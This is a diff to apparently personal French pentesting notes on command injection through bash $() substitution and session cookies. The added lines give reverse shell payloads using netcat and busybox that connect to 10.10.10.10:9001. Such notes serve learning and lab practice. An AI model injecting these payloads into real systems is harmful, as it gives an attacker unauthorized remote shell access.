@@ -17,7 +17,12 @@ Ansi cela permet de bypass la secu si celle-ci est mal configuré.
 Regarder comment sont creer les cookies --> PHPSESSID
 
 
-on peut executer des commande avec $(<comamand>) du genre $(id) == id et donc on peur faire ca avec un reverse shell nc 
+on peut executer des commande avec :
+* $ (comamand) du genre $(id) == id 
+
+et donc on peur faire ca avec un reverse shell nc 
 Explication : La syntaxe `$()` en bash est utilisée pour exécuter une commande à l'intérieur d'une autre commande, puis utiliser la sortie de cette commande dans le contexte externe. Elle est également appelée "command substitution". 
 
-Si cela affiche bien le resultat on peut trouver un bon payload pour exploit. On peut le faire avec la commande busybox qui fait juste la commande qui est apres (`pwd` = `busybox pwd`)
+Si cela affiche bien le resultat on peut trouver un bon payload pour exploit. On peut le faire avec la commande busybox qui fait juste la commande qui est apres (`pwd` = `busybox pwd`) soit par exemple : 
+* $(busybox nc 10.10.10.10 9001 -e sh)
+* & & nc 10.10.10.10 9001 -e sh
